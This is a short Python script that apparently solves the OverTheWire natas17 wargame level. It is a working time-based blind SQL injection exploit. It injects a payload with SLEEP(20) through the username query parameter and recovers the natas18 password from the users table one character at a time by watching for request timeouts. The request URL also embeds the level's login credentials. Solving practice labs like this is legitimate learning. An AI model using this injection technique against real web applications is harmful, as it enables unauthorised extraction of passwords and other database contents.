import requests

character = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
password = ''
for i in range(1,33):
	print "i:" + str(i)
	for p in character:
		blindstring = '" or if(ascii(substring((SELECT password from users where username="natas18"),'+str(i)+',1))=ascii("'+ p +'"),SLEEP(20),null)-- -'
		try:
			print "trying " + p
			r = requests.get('http://natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw@natas17.natas.labs.overthewire.org/?username='+blindstring, timeout=10)
		except requests.exceptions.Timeout:
			password = password + p
			print "pass: " + password
			break
print password
